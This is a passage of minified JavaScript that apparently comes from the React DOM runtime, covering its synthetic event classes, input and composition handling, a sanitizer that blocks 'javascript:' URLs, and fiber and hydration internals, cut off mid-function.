Map([[`acceptCharset`,`accept-charset`],[`htmlFor`,`for`],[`httpEquiv`,`http-equiv`],[`crossOrigin`,`crossorigin`],[`accentHeight`,`accent-height`],[`alignmentBaseline`,`alignment-baseline`],[`arabicForm`,`arabic-form`],[`baselineShift`,`baseline-shift`],[`capHeight`,`cap-height`],[`clipPath`,`clip-path`],[`clipRule`,`clip-rule`],[`colorInterpolation`,`color-interpolation`],[`colorInterpolationFilters`,`color-interpolation-filters`],[`colorProfile`,`color-profile`],[`colorRendering`,`color-rendering`],[`dominantBaseline`,`dominant-baseline`],[`enableBackground`,`enable-background`],[`fillOpacity`,`fill-opacity`],[`fillRule`,`fill-rule`],[`floodColor`,`flood-color`],[`floodOpacity`,`flood-opacity`],[`fontFamily`,`font-family`],[`fontSize`,`font-size`],[`fontSizeAdjust`,`font-size-adjust`],[`fontStretch`,`font-stretch`],[`fontStyle`,`font-style`],[`fontVariant`,`font-variant`],[`fontWeight`,`font-weight`],[`glyphName`,`glyph-name`],[`glyphOrientationHorizontal`,`glyph-orientation-horizontal`],[`glyphOrientationVertical`,`glyph-orientation-vertical`],[`horizAdvX`,`horiz-adv-x`],[`horizOriginX`,`horiz-origin-x`],[`imageRendering`,`image-rendering`],[`letterSpacing`,`letter-spacing`],[`lightingColor`,`lighting-color`],[`markerEnd`,`marker-end`],[`markerMid`,`marker-mid`],[`markerStart`,`marker-start`],[`overlinePosition`,`overline-position`],[`overlineThickness`,`overline-thickness`],[`paintOrder`,`paint-order`],[`panose-1`,`panose-1`],[`pointerEvents`,`pointer-events`],[`renderingIntent`,`rendering-intent`],[`shapeRendering`,`shape-rendering`],[`stopColor`,`stop-color`],[`stopOpacity`,`stop-opacity`],[`strikethroughPosition`,`strikethrough-position`],[`strikethroughThickness`,`strikethrough-thickness`],[`strokeDasharray`,`stroke-dasharray`],[`strokeDashoffset`,`stroke-dashoffset`],[`strokeLinecap`,`stroke-linecap`],[`strokeLinejoin`,`stroke-linejoin`],[`strokeMiterlimit`,`stroke-miterlimit`],[`strokeOpacity`,`stroke-opacity`],[`strokeWidth`,`stroke-width`],[`textAnchor`,`text-anchor`],[`textDecoration`,`text-decoration`],[`textRendering`,`text-rendering`],[`transformOrigin`,`transform-origin`],[`underlinePosition`,`underline-position`],[`underlineThickness`,`underline-thickness`],[`unicodeBidi`,`unicode-bidi`],[`unicodeRange`,`unicode-range`],[`unitsPerEm`,`units-per-em`],[`vAlphabetic`,`v-alphabetic`],[`vHanging`,`v-hanging`],[`vIdeographic`,`v-ideographic`],[`vMathematical`,`v-mathematical`],[`vectorEffect`,`vector-effect`],[`vertAdvY`,`vert-adv-y`],[`vertOriginX`,`vert-origin-x`],[`vertOriginY`,`vert-origin-y`],[`wordSpacing`,`word-spacing`],[`writingMode`,`writing-mode`],[`xmlnsXlink`,`xmlns:xlink`],[`xHeight`,`x-height`]]),cn=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function ln(e){return cn.test(``+e)?`javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')`:e}function un(){}var dn=null;function fn(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var pn=null,mn=null;function hn(e){var t=Et(e);if(t&&(e=t.stateNode)){var n=e[_t]||null;a:switch(e=t.stateNode,t.type){case`input`:if(Yt(e,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name),t=n.name,n.type===`radio`&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll(`input[name="`+Jt(``+t)+`"][type="radio"]`),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var i=r[_t]||null;if(!i)throw Error(o(90));Yt(r,i.value,i.defaultValue,i.defaultValue,i.checked,i.defaultChecked,i.type,i.name)}}for(t=0;t<n.length;t++)r=n[t],r.form===e.form&&Gt(r)}break a;case`textarea`:$t(e,n.value,n.defaultValue);break a;case`select`:t=n.value,t!=null&&Qt(e,!!n.multiple,t,!1)}}}var gn=!1;function _n(e,t,n){if(gn)return e(t,n);gn=!0;try{return e(t)}finally{if(gn=!1,(pn!==null||mn!==null)&&(bu(),pn&&(t=pn,e=mn,mn=pn=null,hn(t),e)))for(t=0;t<e.length;t++)hn(e[t])}}function vn(e,t){var n=e.stateNode;if(n===null)return null;var r=n[_t]||null;if(r===null)return null;n=r[t];a:switch(t){case`onClick`:case`onClickCapture`:case`onDoubleClick`:case`onDoubleClickCapture`:case`onMouseDown`:case`onMouseDownCapture`:case`onMouseMove`:case`onMouseMoveCapture`:case`onMouseUp`:case`onMouseUpCapture`:case`onMouseEnter`:(r=!r.disabled)||(e=e.type,r=!(e===`button`||e===`input`||e===`select`||e===`textarea`)),e=!r;break a;default:e=!1}if(e)return null;if(n&&typeof n!=`function`)throw Error(o(231,t,typeof n));return n}var yn=!(typeof window>`u`||window.document===void 0||window.document.createElement===void 0),bn=!1;if(yn)try{var xn={};Object.defineProperty(xn,"passive",{get:function(){bn=!0}}),window.addEventListener(`test`,xn,xn),window.removeEventListener(`test`,xn,xn)}catch{bn=!1}var Sn=null,Cn=null,wn=null;function Tn(){if(wn)return wn;var e,t=Cn,n=t.length,r,i=`value`in Sn?Sn.value:Sn.textContent,a=i.length;for(e=0;e<n&&t[e]===i[e];e++);var o=n-e;for(r=1;r<=o&&t[n-r]===i[a-r];r++);return wn=i.slice(e,1<r?1-r:void 0)}function En(e){var t=e.keyCode;return`charCode`in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Dn(){return!0}function On(){return!1}function kn(e){function t(t,n,r,i,a){for(var o in this._reactName=t,this._targetInst=r,this.type=n,this.nativeEvent=i,this.target=a,this.currentTarget=null,e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(i):i[o]);return this.isDefaultPrevented=(i.defaultPrevented==null?!1===i.returnValue:i.defaultPrevented)?Dn:On,this.isPropagationStopped=On,this}return h(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():typeof e.returnValue!=`unknown`&&(e.returnValue=!1),this.isDefaultPrevented=Dn)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():typeof e.cancelBubble!=`unknown`&&(e.cancelBubble=!0),this.isPropagationStopped=Dn)},persist:function(){},isPersistent:Dn}),t}var An={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},jn=kn(An),Mn=h({},An,{view:0,detail:0}),Nn=kn(Mn),Pn,Fn,In,Ln=h({},Mn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:qn,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return`movementX`in e?e.movementX:(e!==In&&(In&&e.type===`mousemove`?(Pn=e.screenX-In.screenX,Fn=e.screenY-In.screenY):Fn=Pn=0,In=e),Pn)},movementY:function(e){return`movementY`in e?e.movementY:Fn}}),Rn=kn(Ln),k=kn(h({},Ln,{dataTransfer:0})),zn=kn(h({},Mn,{relatedTarget:0})),Bn=kn(h({},An,{animationName:0,elapsedTime:0,pseudoElement:0})),Vn=kn(h({},An,{clipboardData:function(e){return`clipboardData`in e?e.clipboardData:window.clipboardData}})),Hn=kn(h({},An,{data:0})),Un={Esc:`Escape`,Spacebar:` `,Left:`ArrowLeft`,Up:`ArrowUp`,Right:`ArrowRight`,Down:`ArrowDown`,Del:`Delete`,Win:`OS`,Menu:`ContextMenu`,Apps:`ContextMenu`,Scroll:`ScrollLock`,MozPrintableKey:`Unidentified`},Wn={8:`Backspace`,9:`Tab`,12:`Clear`,13:`Enter`,16:`Shift`,17:`Control`,18:`Alt`,19:`Pause`,20:`CapsLock`,27:`Escape`,32:` `,33:`PageUp`,34:`PageDown`,35:`End`,36:`Home`,37:`ArrowLeft`,38:`ArrowUp`,39:`ArrowRight`,40:`ArrowDown`,45:`Insert`,46:`Delete`,112:`F1`,113:`F2`,114:`F3`,115:`F4`,116:`F5`,117:`F6`,118:`F7`,119:`F8`,120:`F9`,121:`F10`,122:`F11`,123:`F12`,144:`NumLock`,145:`ScrollLock`,224:`Meta`},Gn={Alt:`altKey`,Control:`ctrlKey`,Meta:`metaKey`,Shift:`shiftKey`};function Kn(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Gn[e])?!!t[e]:!1}function qn(){return Kn}var Jn=kn(h({},Mn,{key:function(e){if(e.key){var t=Un[e.key]||e.key;if(t!==`Unidentified`)return t}return e.type===`keypress`?(e=En(e),e===13?`Enter`:String.fromCharCode(e)):e.type===`keydown`||e.type===`keyup`?Wn[e.keyCode]||`Unidentified`:``},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:qn,charCode:function(e){return e.type===`keypress`?En(e):0},keyCode:function(e){return e.type===`keydown`||e.type===`keyup`?e.keyCode:0},which:function(e){return e.type===`keypress`?En(e):e.type===`keydown`||e.type===`keyup`?e.keyCode:0}})),Yn=kn(h({},Ln,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),Xn=kn(h({},Mn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:qn})),Zn=kn(h({},An,{propertyName:0,elapsedTime:0,pseudoElement:0})),Qn=kn(h({},Ln,{deltaX:function(e){return`deltaX`in e?e.deltaX:`wheelDeltaX`in e?-e.wheelDeltaX:0},deltaY:function(e){return`deltaY`in e?e.deltaY:`wheelDeltaY`in e?-e.wheelDeltaY:`wheelDelta`in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0})),$n=kn(h({},An,{newState:0,oldState:0})),er=[9,13,27,32],tr=yn&&`CompositionEvent`in window,nr=null;yn&&`documentMode`in document&&(nr=document.documentMode);var A=yn&&`TextEvent`in window&&!nr,rr=yn&&(!tr||nr&&8<nr&&11>=nr),ir=` `,ar=!1;function or(e,t){switch(e){case`keyup`:return er.indexOf(t.keyCode)!==-1;case`keydown`:return t.keyCode!==229;case`keypress`:case`mousedown`:case`focusout`:return!0;default:return!1}}function sr(e){return e=e.detail,typeof e==`object`&&`data`in e?e.data:null}var cr=!1;function j(e,t){switch(e){case`compositionend`:return sr(t);case`keypress`:return t.which===32?(ar=!0,ir):null;case`textInput`:return e=t.data,e===ir&&ar?null:e;default:return null}}function lr(e,t){if(cr)return e===`compositionend`||!tr&&or(e,t)?(e=Tn(),wn=Cn=Sn=null,cr=!1,e):null;switch(e){case`paste`:return null;case`keypress`:if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case`compositionend`:return rr&&t.locale!==`ko`?null:t.data;default:return null}}var ur={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function dr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t===`input`?!!ur[e.type]:t===`textarea`}function fr(e,t,n,r){pn?mn?mn.push(r):mn=[r]:pn=r,t=Ed(t,`onChange`),0<t.length&&(n=new jn(`onChange`,`change`,null,n,r),e.push({event:n,listeners:t}))}var pr=null,mr=null;function hr(e){yd(e,0)}function gr(e){if(Gt(Dt(e)))return e}function _r(e,t){if(e===`change`)return t}var vr=!1;if(yn){var yr;if(yn){var br=`oninput`in document;if(!br){var xr=document.createElement(`div`);xr.setAttribute(`oninput`,`return;`),br=typeof xr.oninput==`function`}yr=br}else yr=!1;vr=yr&&(!document.documentMode||9<document.documentMode)}function Sr(){pr&&(pr.detachEvent(`onpropertychange`,Cr),mr=pr=null)}function Cr(e){if(e.propertyName===`value`&&gr(mr)){var t=[];fr(t,mr,e,fn(e)),_n(hr,t)}}function wr(e,t,n){e===`focusin`?(Sr(),pr=t,mr=n,pr.attachEvent(`onpropertychange`,Cr)):e===`focusout`&&Sr()}function Tr(e){if(e===`selectionchange`||e===`keyup`||e===`keydown`)return gr(mr)}function Er(e,t){if(e===`click`)return gr(t)}function Dr(e,t){if(e===`input`||e===`change`)return gr(t)}function Or(e,t){return e===t&&(e!==0||1/e==1/t)||e!==e&&t!==t}var kr=typeof Object.is==`function`?Object.is:Or;function Ar(e,t){if(kr(e,t))return!0;if(typeof e!=`object`||!e||typeof t!=`object`||!t)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!je.call(t,i)||!kr(e[i],t[i]))return!1}return!0}function jr(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Mr(e,t){var n=jr(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}a:{for(;n;){if(n.nextSibling){n=n.nextSibling;break a}n=n.parentNode}n=void 0}n=jr(n)}}function Nr(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Nr(e,t.parentNode):`contains`in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Pr(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Kt(e.document);t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href==`string`}catch{n=!1}if(n)e=t.contentWindow;else break;t=Kt(e.document)}return t}function Fr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t===`input`&&(e.type===`text`||e.type===`search`||e.type===`tel`||e.type===`url`||e.type===`password`)||t===`textarea`||e.contentEditable===`true`)}var Ir=yn&&`documentMode`in document&&11>=document.documentMode,Lr=null,Rr=null,zr=null,Br=!1;function Vr(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Br||Lr==null||Lr!==Kt(r)||(r=Lr,`selectionStart`in r&&Fr(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),zr&&Ar(zr,r)||(zr=r,r=Ed(Rr,`onSelect`),0<r.length&&(t=new jn(`onSelect`,`select`,null,t,n),e.push({event:t,listeners:r}),t.target=Lr)))}function Hr(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n[`Webkit`+e]=`webkit`+t,n[`Moz`+e]=`moz`+t,n}var Ur={animationend:Hr(`Animation`,`AnimationEnd`),animationiteration:Hr(`Animation`,`AnimationIteration`),animationstart:Hr(`Animation`,`AnimationStart`),transitionrun:Hr(`Transition`,`TransitionRun`),transitionstart:Hr(`Transition`,`TransitionStart`),transitioncancel:Hr(`Transition`,`TransitionCancel`),transitionend:Hr(`Transition`,`TransitionEnd`)},Wr={},Gr={};yn&&(Gr=document.createElement(`div`).style,`AnimationEvent`in window||(delete Ur.animationend.animation,delete Ur.animationiteration.animation,delete Ur.animationstart.animation),`TransitionEvent`in window||delete Ur.transitionend.transition);function Kr(e){if(Wr[e])return Wr[e];if(!Ur[e])return e;var t=Ur[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in Gr)return Wr[e]=t[n];return e}var qr=Kr(`animationend`),Jr=Kr(`animationiteration`),Yr=Kr(`animationstart`),Xr=Kr(`transitionrun`),Zr=Kr(`transitionstart`),Qr=Kr(`transitioncancel`),$r=Kr(`transitionend`),ei=new Map,ti=`abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel`.split(` `);ti.push(`scrollEnd`);function ni(e,t){ei.set(e,t),Mt(t,[e])}var ri=typeof reportError==`function`?reportError:function(e){if(typeof window==`object`&&typeof window.ErrorEvent==`function`){var t=new window.ErrorEvent(`error`,{bubbles:!0,cancelable:!0,message:typeof e==`object`&&e&&typeof e.message==`string`?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process==`object`&&typeof process.emit==`function`){process.emit(`uncaughtException`,e);return}console.error(e)},ii=[],ai=0,oi=0;function si(){for(var e=ai,t=oi=ai=0;t<e;){var n=ii[t];ii[t++]=null;var r=ii[t];ii[t++]=null;var i=ii[t];ii[t++]=null;var a=ii[t];if(ii[t++]=null,r!==null&&i!==null){var o=r.pending;o===null?i.next=i:(i.next=o.next,o.next=i),r.pending=i}a!==0&&di(n,i,a)}}function ci(e,t,n,r){ii[ai++]=e,ii[ai++]=t,ii[ai++]=n,ii[ai++]=r,oi|=r,e.lanes|=r,e=e.alternate,e!==null&&(e.lanes|=r)}function li(e,t,n,r){return ci(e,t,n,r),fi(e)}function ui(e,t){return ci(e,null,null,t),fi(e)}function di(e,t,n){e.lanes|=n;var r=e.alternate;r!==null&&(r.lanes|=n);for(var i=!1,a=e.return;a!==null;)a.childLanes|=n,r=a.alternate,r!==null&&(r.childLanes|=n),a.tag===22&&(e=a.stateNode,e===null||e._visibility&1||(i=!0)),e=a,a=a.return;return e.tag===3?(a=e.stateNode,i&&t!==null&&(i=31-Je(n),e=a.hiddenUpdates,r=e[i],r===null?e[i]=[t]:r.push(t),t.lane=n|536870912),a):null}function fi(e){if(50<du)throw du=0,fu=null,Error(o(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var pi={};function mi(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function hi(e,t,n,r){return new mi(e,t,n,r)}function gi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function _i(e,t){var n=e.alternate;return n===null?(n=hi(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&65011712,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n.refCleanup=e.refCleanup,n}function vi(e,t){e.flags&=65011714;var n=e.alternate;return n===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=n.childLanes,e.lanes=n.lanes,e.child=n.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=n.memoizedProps,e.memoizedState=n.memoizedState,e.updateQueue=n.updateQueue,e.type=n.type,t=n.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function yi(e,t,n,r,i,a){var s=0;if(r=e,typeof e==`function`)gi(e)&&(s=1);else if(typeof e==`string`)s=Uf(e,n,ge.current)?26:e===`html`||e===`head`||e===`body`?27:5;else a:switch(e){case ie:return e=hi(31,n,t,i),e.elementType=ie,e.lanes=a,e;case y:return bi(n.children,i,a,t);case b:s=8,i|=24;break;case x:return e=hi(12,n,t,i|2),e.elementType=x,e.lanes=a,e;case te:return e=hi(13,n,t,i),e.elementType=te,e.lanes=a,e;case ne:return e=hi(19,n,t,i),e.elementType=ne,e.lanes=a,e;default:if(typeof e==`object`&&e)switch(e.$$typeof){case C:s=10;break a;case S:s=9;break a;case ee:s=11;break a;case re:s=14;break a;case w:s=16,r=null;break a}s=29,n=Error(o(130,e===null?`null`:typeof e,``)),r=null}return t=hi(s,n,t,i),t.elementType=e,t.type=r,t.lanes=a,t}function bi(e,t,n,r){return e=hi(7,e,r,t),e.lanes=n,e}function xi(e,t,n){return e=hi(6,e,null,t),e.lanes=n,e}function Si(e){var t=hi(18,null,null,0);return t.stateNode=e,t}function Ci(e,t,n){return t=hi(4,e.children===null?[]:e.children,e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var wi=new WeakMap;function Ti(e,t){if(typeof e==`object`&&e){var n=wi.get(e);return n===void 0?(t={value:e,source:t,stack:Ae(t)},wi.set(e,t),t):n}return{value:e,source:t,stack:Ae(t)}}var Ei=[],Di=0,Oi=null,ki=0,Ai=[],ji=0,Mi=null,Ni=1,Pi=``;function Fi(e,t){Ei[Di++]=ki,Ei[Di++]=Oi,Oi=e,ki=t}function Ii(e,t,n){Ai[ji++]=Ni,Ai[ji++]=Pi,Ai[ji++]=Mi,Mi=e;var r=Ni;e=Pi;var i=32-Je(r)-1;r&=~(1<<i),n+=1;var a=32-Je(t)+i;if(30<a){var o=i-i%5;a=(r&(1<<o)-1).toString(32),r>>=o,i-=o,Ni=1<<32-Je(t)+i|n<<i|r,Pi=a+e}else Ni=1<<a|n<<i|r,Pi=e}function Li(e){e.return!==null&&(Fi(e,1),Ii(e,1,0))}function Ri(e){for(;e===Oi;)Oi=Ei[--Di],Ei[Di]=null,ki=Ei[--Di],Ei[Di]=null;for(;e===Mi;)Mi=Ai[--ji],Ai[ji]=null,Pi=Ai[--ji],Ai[ji]=null,Ni=Ai[--ji],Ai[ji]=null}function zi(e,t){Ai[ji++]=Ni,Ai[ji++]=Pi,Ai[ji++]=Mi,Ni=t.id,Pi=t.overflow,Mi=e}var Bi=null,M=null,N=!1,Vi=null,Hi=!1,Ui=Error(o(519));function Wi(e){throw Xi(Ti(Error(o(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?`text`:`HTML`,``)),e)),Ui}function Gi(e){var t=e.stateNode,n=e.type,r=e.memoizedProps;switch(t[O]=e,t[_t]=r,n){case`dialog`:Q(`cancel`,t),Q(`close`,t);break;case`iframe`:case`object`:case`embed`:Q(`load`,t);break;case`video`:case`audio`:for(n=0;n<_d.length;n++)Q(_d[n],t);break;case`source`:Q(`error`,t);break;case`img`:case`image`:case`link`:Q(`error`,t),Q(`load`,t);break;case`details`:Q(`toggle`,t);break;case`input`:Q(`invalid`,t),Xt(t,r.value,r.defaultValue,r.checked,r.defaultChecked,r.type,r.name,!0);break;case`select`:Q(`invalid`,t);break;case`textarea`:Q(`invalid`,t),en(t,r.value,r.defaultValue,r.children)}n=r.children,typeof n!=`string`&&typeof n!=`number`&&typeof n!=`bigint`||t.textContent===``+n||!0===r.suppressHydrationWarning||Md(t.textContent,n)?(r.popover!=null&&(Q(`beforetoggle`,t),Q(`toggle`,t)),r.onScroll!=null&&Q(`scroll`,t),r.onScrollEnd!=null&&Q(`scrollend`,t),r.onClick!=null&&(t.onclick=un),t=!0):t=!1,t||Wi(e,!0)}function Ki(e){for(Bi=e.return;Bi;)switch(Bi.tag){case 5:case 31:case 13:Hi=!1;return;case 27:case 3:Hi=!0;return;default:Bi=Bi.return}}function qi(e){if(e!==Bi)return!1;if(!N)return Ki(e),N=!0,!1;var t=e.tag,n;if((n=t!==3&&t!==27)&&((n=t===5)&&(n=e.type,n=!(n!==`form`&&n!==`button`)||Ud(e.type,e.memoizedProps)),n=!n),n&&M&&Wi(e),Ki(e),t===13){if(e=e.memoizedState,e=e===null?null:e.dehydrated,!e)throw Error(o(317));M=uf(e)}else if(t===31){if(e=e.memoizedState,e=e===null?null:e.dehydrated,!e)throw Error(o(317));M=uf(e)}else t===27?(t=M,Zd(e.type)?(e=lf,lf=null,M=e):M=t):M=Bi?cf(e.stateNode.nextSibling):null;return!0}function Ji(){M=Bi=null,N=!1}function Yi(){var e=Vi;return e!==null&&(Zl===null?Zl=e:Zl.push.apply(Zl,e),Vi=null),e}function Xi(e){Vi===null?Vi=[e]:Vi.push(e)}var Zi=me(null),Qi=null,$i=null;function ea(e,t,n){D(Zi,t._currentValue),t._currentValue=n}function ta(e){e._currentValue=Zi.current,he(Zi)}function na(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)===t?r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t):(e.childLanes|=t,r!==null&&(r.childLanes|=t)),e===n)break;e=e.return}}function ra(e,t,n,r){var i=e.child;for(i!==null&&(i.return=e);i!==null;){var a=i.dependencies;if(a!==null){var s=i.child;a=a.firstContext;a:for(;a!==null;){var c=a;a=i;for(var l=0;l<t.length;l++)if(c.context===t[l]){a.lanes|=n,c=a.alternate,c!==null&&(c.lanes|=n),na(a.return,n,e),r||(s=null);break a}a=c.next}}else if(i.tag===18){if(s=i.return,s===null)throw Error(o(341));s.lanes|=n,a=s.alternate,a!==null&&(a.lanes|=n),na(s,n,e),s=null}else s=i.child;if(s!==null)s.return=i;else for(s=i;s!==null;){if(s===e){s=null;break}if(i=s.sibling,i!==null){i.return=s.return,s=i;break}s=s.return}i=s}}function ia(e,t,n,r){e=null;for(var i=t,a=!1;i!==null;){if(!a){if(i.flags&524288)a=!0;else if(i.flags&262144)break}if(i.tag===10){var s=i.alternate;if(s===null)throw Error(o(387));if(s=s.memoizedProps,s!==null){var c=i.type;kr(i.pendingProps.value,s.value)||(e===null?e=[c]:e.push(c))}}else if(i===ye.current){if(s=i.alternate,s===null)throw Error(o(387));s.memoizedState.memoizedState!==i.memoizedState.memoizedState&&(e===null?e=[Qf]:e.push(Qf))}i=i.return}e!==null&&ra(t,e,n,r),t.flags|=262144}function aa(e){for(e=e.firstContext;e!==null;){if(!kr(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function oa(e){Qi=e,$i=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function sa(e){return la(Qi,e)}function ca(e,t){return Qi===null&&oa(e),la(e,t)}function la(e,t){var n=t._currentValue;if(t={context:t,memoizedValue:n,next:null},$i===null){if(e===null)throw Error(o(308));$i=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else $i=$i.next=t;return n}var ua=typeof AbortController<`u`?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(t,n){e.push(n)}};this.abort=function(){t.aborted=!0,e.forEach(function(e){return e()})}},da=n.unstable_scheduleCallback,fa=n.unstable_NormalPriority,P={$$typeof:C,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function pa(){return{controller:new ua,data:new Map,refCount:0}}function ma(e){e.refCount--,e.refCount===0&&da(fa,function(){e.controller.abort()})}var ha=null,ga=0,_a=0,va=null;function ya(e,t){if(ha===null){var n=ha=[];ga=0,_a=dd(),va={status:`pending`,value:void 0,then:function(e){n.push(e)}}}return ga++,t.then(ba,ba),t}function ba(){if(--ga===0&&ha!==null){va!==null&&(va.status=`fulfilled`);var e=ha;ha=null,_a=0,va=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function xa(e,t){var n=[],r={status:`pending`,value:null,reason:null,then:function(e){n.push(e)}};return e.then(function(){r.status=`fulfilled`,r.value=t;for(var e=0;e<n.length;e++)(0,n[e])(t)},function(e){for(r.status=`rejected`,r.reason=e,e=0;e<n.length;e++)(0,n[e])(void 0)}),r}var Sa=T.S;T.S=function(e,t){eu=Ie(),typeof t==`object`&&t&&typeof t.then==`function`&&ya(e,t),Sa!==null&&Sa(e,t)};var Ca=me(null);function wa(){var e=Ca.current;return e===null?K.pooledCache:e}function Ta(e,t){t===null?D(Ca,Ca.current):D(Ca,t.pool)}function Ea(){var e=wa();return e===null?null:{parent:P._currentValue,pool:e}}var Da=Error(o(460)),Oa=Error(o(474)),ka=Error(o(542)),Aa={then:function(){}};function ja(e){return e=e.status,e===`fulfilled`||e===`rejected`}function Ma(e,t,n){switch(n=e[n],n===void 0?e.push(t):n!==t&&(t.then(un,un),t=n),t.status){case`fulfilled`:return t.value;case`rejected`:throw e=t.reason,Ia(e),e;default:if(typeof t.status==`string`)t.then(un,un);else{if(e=K,e!==null&&100<e.shellSuspendCounter)throw Error(o(482));e=t,e.status=`pending`,e.then(function(e){if(t.status===`pending`){var n=t;n.status=`fulfilled`,n.value=e}},function(e){if(t.status===`pending`){var n=t;n.status=`rejected`,n.reason=e}})}switch(t.status){case`fulfilled`:return t.value;case`rejected`:throw e=t.reason,Ia(e),e}throw Pa=t,Da}}function Na(e){try{var t=e._init;return t(e._payload)}catch(e){throw typeof e==`object`&&e&&typeof e.then==`function`?(Pa=e,Da):e}}var Pa=null;function Fa(){if(Pa===null)throw Error(o(459));var e=Pa;return Pa=null,e}function Ia(e){if(e===Da||e===ka)throw Error(o(483))}var La=null,Ra=0;function za(e){var t=Ra;return Ra+=1,La===null&&(La=[]),Ma(La,e,t)}function Ba(e,t){t=t.props.ref,e.ref=t===void 0?null:t}function Va(e,t){throw 